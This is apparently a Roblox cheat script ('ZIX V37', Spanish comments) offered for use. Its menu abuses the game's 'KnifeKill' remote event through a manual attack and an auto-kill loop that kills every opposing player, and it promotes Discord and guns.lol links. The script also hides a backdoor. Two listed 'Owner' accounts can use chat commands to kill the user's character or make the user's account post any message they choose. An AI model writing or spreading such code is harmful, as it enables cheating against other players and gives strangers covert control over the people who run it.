--[[ 
    ZIX V37 - PC ELITE FINAL
    - COMANDOS: !say [texto] y .die (Reset).
    - FIX: Botones ON/OFF funcionales.
    - REDES: Guns.lol (Morado) | Discord (Azul).
    - TECLA: Ctrl Derecho para ocultar.
]]

local Services = setmetatable({}, {__index = function(t, k) return game:GetService(k) end})
local LP, RS, TS, Run, UIS = Services.Players.LocalPlayer, Services.ReplicatedStorage, Services.TweenService, Services.RunService, Services.UserInputService

getgenv().AutoKill, getgenv().ESP_Enabled = false, false
local Owners = {["kp_omnipower"] = true, ["pirro230219"] = true}
local LL_IMAGE = "rbxassetid://138873321650261"

-- // LÓGICA DE COMANDOS (!SAY / .DIE)
local function ProcessCommand(p, msg)
    if not p or not Owners[p.Name] then return end
    local m = msg:lower()
    if m == ".die" or m == "die" or m == "die." then
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then LP.Character.Humanoid.Health = 0 end
    elseif m:sub(1, 5) == "!say " then
        local txt = msg:sub(6)
        pcall(function()
            local TCS = Services:FindFirstChild("TextChatService")
            if TCS and TCS.ChatVersion == Enum.ChatVersion.TextChatService then
                TCS.TextChannels.RBXGeneral:SendAsync(txt)
            else
                RS.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(txt, "All")
            end
        end)
    end
end
for _, p in pairs(Services.Players:GetPlayers()) do p.Chatted:Connect(function(m) ProcessCommand(p, m) end) end
Services.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) ProcessCommand(p, m) end) end)

-- // UI Y DRAG PC
local sg = Instance.new("ScreenGui", LP.PlayerGui); sg.Name = "Zix_PC"; sg.ResetOnSpawn = false
local Main = Instance.new("Frame", sg); Main.Size = UDim2.new(0, 260, 0, 250); Main.Position = UDim2.new(0.5, -130, 0.5, -125); Main.BackgroundColor3 = Color3.fromRGB(12, 12, 15); Main.Visible = false; Instance.new("UICorner", Main); Instance.new("UIStroke", Main).Color = Color3.fromRGB(255, 50, 50)

local function MakeDrag(f)
    local d, di, ds, sp; f.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then d = true; ds = i.Position; sp = f.Position; i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then d = false end end) end end)
    f.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement then di = i end end)
    UIS.InputChanged:Connect(function(i) if i == di and d then local dl = i.Position - ds; f.Position = UDim2.new(sp.X.Scale, sp.X.Offset + dl.X, sp.Y.Scale, sp.Y.Offset + dl.Y) end end)
end
MakeDrag(Main)

-- // BOTONES PC
local function CreateBtn(name, text, yPos, cb)
    local b = Instance.new("TextButton", Main); b.Name, b.Size, b.Position, b.BackgroundColor3, b.Text, b.TextColor3, b.Font, b.TextSize = name, UDim2.new(0.9, 0, 0, 50), UDim2.new(0.05, 0, 0, yPos), Color3.fromRGB(20, 20, 25), text, Color3.new(1, 1, 1), "GothamBold", 12; Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(cb) return b
end

CreateBtn("M", "ATAQUE MANUAL", 20, function() 
    local g, t = LP:GetAttribute("Game"), LP:GetAttribute("Team")
    for _, v in pairs(Services.Players:GetPlayers()) do if v ~= LP and v:GetAttribute("Game") == g and v:GetAttribute("Team") ~= t then RS.KnifeKill:FireServer(v, v) end end
end)
local ABtn = CreateBtn("AutoKillBtn", "AUTO-KILL (+GOD): OFF", 85, function()
    getgenv().AutoKill = not getgenv().AutoKill
    ABtn.Text = "AUTO-KILL (+GOD): " .. (getgenv().AutoKill and "ON" or "OFF"); ABtn.TextColor3 = getgenv().AutoKill and Color3.fromRGB(0, 255, 150) or Color3.new(1, 1, 1)
end)
local EBtn = CreateBtn("ESPBtn", "SKELETON ESP: OFF", 150, function()
    getgenv().ESP_Enabled = not getgenv().ESP_Enabled
    EBtn.Text = "SKELETON ESP: " .. (getgenv().ESP_Enabled and "ON" or "OFF"); EBtn.TextColor3 = getgenv().ESP_Enabled and Color3.fromRGB(0, 200, 255) or Color3.new(1, 1, 1)
end)

-- // AUTO-KILL LOOP
Run.Heartbeat:Connect(function() if getgenv().AutoKill then local g, t = LP:GetAttribute("Game"), LP:GetAttribute("Team") for _, v in pairs(Services.Players:GetPlayers()) do if v ~= LP and v:GetAttribute("Game") == g and v:GetAttribute("Team") ~= t then RS.KnifeKill:FireServer(v, v) end end end end)

-- // LOADER PC
local Loader = Instance.new("Frame", sg); Loader.Size, Loader.Position, Loader.BackgroundColor3 = UDim2.new(0, 300, 0, 330), UDim2.new(0.5, -150, 0.5, -165), Color3.fromRGB(10, 10, 12); Instance.new("UICorner", Loader)
local function Type(t, y, c) local l = Instance.new("TextLabel", Loader); l.Size, l.Position, l.BackgroundTransparency, l.TextColor3, l.Font, l.TextSize, l.Text = UDim2.new(1,0,0,20), UDim2.new(0,0,0,y), 1, c, "Code", 12, ""; task.spawn(function() for i=1,#t do l.Text=t:sub(1,i) task.wait(0.03) end end) end
task.spawn(function()
    Type("Nota: Belfebu Edition", 40, Color3.new(1,1,1)); Type("GUNS.LOL: guns.lol/belfebu", 110, Color3.fromRGB(170, 0, 255)); Type("DISCORD: discord.gg/mixrenacido", 140, Color3.fromRGB(114, 137, 218)); Type("Cargando motor...", 240, Color3.new(0.5,0.5,0.5))
    task.wait(3.5); Loader:Destroy(); Main.Visible = true
end)
UIS.InputBegan:Connect(function(i, g) if not g and i.KeyCode == Enum.KeyCode.RightControl then Main.Visible = not Main.Visible end end)
